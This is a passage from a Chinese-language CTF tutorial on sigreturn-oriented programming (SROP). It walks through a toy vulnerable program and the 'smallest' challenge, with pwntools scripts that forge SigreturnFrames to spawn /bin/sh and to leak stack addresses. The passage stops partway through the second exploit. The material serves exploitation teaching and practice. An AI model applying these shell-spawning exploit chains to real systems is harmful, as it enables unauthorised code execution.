            "jmp exit\n"
第一行”mov $0, %%rdi\n”指的是置rdi的值为0，应该是sigreturn系统调用需要让rdi为0.
第二行”mov %%rsi,
%%rsp\n”这句比较关键，刚刚我们看到rsi已经指到了global_buf上，我们可在在global_buf上写入伪sigFrame，这句指令是让rsp置为rsi的值，即让rsp也指向global_buf头部，也就是伪sigFrame的头部，也就是rt_sigreturn的位置。
第三行”mov $15, %%rax\n”，将rax值设置为15，即sigreturn的系统调用号
第四行”syscall\n”，触发sigreturn系统调用，此时sigreturn相关代码会根据此时rsp的值，去对rsp所指向的位置进行sigFrame恢复，而此时rsp指向的位置正是我们传入的伪sigFrame的位置，即global_buf头部这个位置，从而按照这个伪sigFrame来进行恢复。
第五行跳到exit标识处。
后面的代码比较简单
            // syscall 的 symbol，便于查找
            "syscall:\n"
            "syscall\n"
            "jmp exit\n"
            // 退出程序
            "exit:\n"
            "mov $60, %%rax\n"
            "mov $0, %%rsi\n"
            "syscall\n" 
前两行汇编先随便调调syscall，方便找到syscall的地址。然后就是exit流程，不细说了。
编译上面的C代码后，得到srop程序
可以简单测测，随便输几个字母进去，会直接退出，我就不贴这个截图了，大家自测。
接下来我们要传入更多字符（大于0xf8），即传入伪sigFrame，利用代码如下
    from pwn import *
    context(
        log_level='debug',
        arch = "amd64",
        binary = "./srop"
    )
    # the c program is easy. It just read() a string in. It can receive 0x200 max. and then check if the input string is longer than sizeof(ucontext_t) which is also called sigFrame(the size is 0xf8), if not, the program exits. if so, the program set rsp to global_buf and trigger sigreturn directly. and then the sigFrame is recovered by sigreturn syscall, so we got execve syscall executed ending up with a shell.
    io = process()
    elf = ELF('./srop')
    # create debug file
    try:
        f = open('pid', 'w')
        f.write(str(proc.pidof(io)[0]))
        f.close()
    except Exception as e:
        print(e)
    str_bin_sh_offset = 0x100
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset  # we already know global_buf addr, and we add an offset to get binsh addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = elf.symbols['syscall']
    io.send(str(frame).ljust(str_bin_sh_offset, "a") + "/bin/sh\x00")   # ljust means "a" will be on right side to fill the gap, the true string is on the left.
    io.interactive()
    os.system('rm -f pid')
讲一下核心部分
    str_bin_sh_offset = 0x100
首先给个str_bin_sh_offset，构造的sigFrame就在这个offset内部，然后不够0x100这么大的部分，填一堆“a”，最后在这个offset后面加上“/bin/sh”字符串。这个offset，改成0x101、0x150都行，能装下sigFrame，又不大于本题read函数的最大值0x200即可。
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset  # we already know global_buf addr, and we add an offset to get binsh addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = elf.symbols['syscall']
然后就是构造伪sigFrame，rax设置成execve调用号
rdi设置成binsh的地址，这里global_buf作为全局变量，我们可以在ida中看到它的地址的，如下图：
可见，global_buf地址为0x600180，代码中elf.sysbols[‘global_buf’]可以达到一样的功能，得到global_buf的地址。所以，rdi是这样设置成binsh的地址的：先找到global_buf头地址，然后加上str_bin_sh_offset，我们在这个位置写上“/bin/sh\x00”即可。
rsi、rdi作为execve的参数写成0
rip写成syscall的地址，用来触发execve系统调用
io.send(str(frame).ljust(str_bin_sh_offset, “a”) + “/bin/sh\x00”) # ljust
means “a” will be on right side to fill the gap, the true string is on the
left.
这段代码，是让read函数读入一段字符串，这段字符串构成为str(frame).ljust(str_bin_sh_offset, “a”) +
“/bin/sh\x00″，首先是一个sigFrame，然后是一堆“a”，最后是“/bin/sh\x00”字符串，保证“/bin/sh\x00”字符串距离global_buf头部距离为0x100，所以使用ljust，如下为具体传入时的具体字节，及最后的触发execve成功getshell：
可见确实发送了0x100+0x8个字节，最后0x8即为“/bin/sh\x00”字符串。
好了，从上面例子中我们看到了手动触发sigreturn，让其恢复我们传入的伪sigFrame，来恢复成一个execve
shell的过程。接下来，做一道2016年-360春秋杯-srop赛题smallest，这道题难度相较于上面示例难度要更大些，因为涉及到了srop链，我会尽量每个细节点都讲到，请不要嫌我啰嗦。
首先讲smallest丢进ida，看到代码相当简单：
怪不得叫smallest，一共就6行汇编：
    xor rax, rax 
    mov edx, 400h 
    mov rsi, rsp 
    mov rdi, rax 
    syscall 
    retn
第一行置rax为0，即置系统调用号为0，为read的系统调用号
第二行设置edx为400，可以读入0x400个字节，百分百溢出了，而且溢出的空间还挺大，可以考虑srop了
第三行让rsi指向rsp所指向的位置，即让rsi指向当前栈顶，read进来的字符串，直接从栈顶开始覆盖内容
第四行让rdi值为0，即read函数的fd参数为0，代表从标准输入流读入
第五行syscall，触发系统调用，开始进行read
第六行retn，“pop”当前栈顶处内容给rip，从这行可见，rsp所指向的位置就是这段代码的返回地址，即我们往栈顶写什么地址，最后ret的时候，就会跳到这个地址。和通常的栈溢出不一样，没有那些padding的段落，直接上来就是覆盖返回地址。
OK，那怎么利用呢？先贴利用代码，再一段段解释
    from pwn import *
    from LibcSearcher import *
    small = ELF('./smallest')
    if args['REMOTE']:
        sh = remote('127.0.0.1', 7777)
    else:
        sh = process('./smallest')
    context.arch = 'amd64'
    context.log_level = 'debug'
    syscall_ret = 0x00000000004000BE
    start_addr = 0x00000000004000B0
    ## set start addr three times
    # xor     rax, rax
    # mov     edx, 400h
    # mov     rsi, rsp
    # mov     rdi, rax
    # syscall                
    # retn
    # the code of smallest just set rsi to rsp, so when read triggered(which is also means syscall executed), we just write things on the top of the stack.
    # and then the last retn will pop what rsp is pointing to to rip, so what read() write on the top of the stack will be result in rip to execute.
    gdb.attach(sh)
    payload = p64(start_addr) * 3
    sh.send(payload)
    # gdb.attach(sh)
    raw_input()
    ## modify the return addr to start_addr+3
    ## so that skip the xor rax,rax; then the rax=1
    ## get stack addr
    sh.send('\xb3')
    raw_input()
    stack_addr = u64(sh.recv()[8:16])
    raw_input()
    log.success('leak stack addr :' + hex(stack_addr))
    raw_input()
    ## make the rsp point to stack_addr
    ## the frame is read(0,stack_addr,0x400)
    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_read
    sigframe.rdi = 0
    sigframe.rsi = stack_addr
    sigframe.rdx = 0x400
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    payload = p64(start_addr) + 'a' * 8 + str(sigframe)
    sh.send(payload)
    raw_input()